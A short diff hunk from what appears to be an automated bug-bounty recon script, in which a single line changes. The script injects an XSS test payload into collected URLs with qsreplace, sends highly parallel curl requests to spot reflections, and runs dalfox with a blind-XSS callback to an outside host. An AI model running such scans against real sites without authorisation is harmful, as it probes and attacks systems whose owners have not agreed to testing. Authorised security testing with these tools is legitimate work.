@@ -70,7 +70,7 @@ cat $1/parameters.txt | gf xss | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" |
 #------------------------------------------------#
 cat $1/xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 5000 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q $1/xss.txt &> /dev/null
 #------------------------------------------------#
-dalfox file $1/xssPatterns.txt pipe --silence --no-color --no-spinner --skip-bav -w 300 -b saad.xss.ht 2> /dev/null | anew -q $1/xss.txt &> /dev/null
+dalfox file $1/xssPatterns.txt pipe --silence --no-color --no-spinner -w 300 -b saad.xss.ht 2> /dev/null | anew -q $1/xss.txt &> /dev/null
 
 echo -e "BLINDER \n"
 
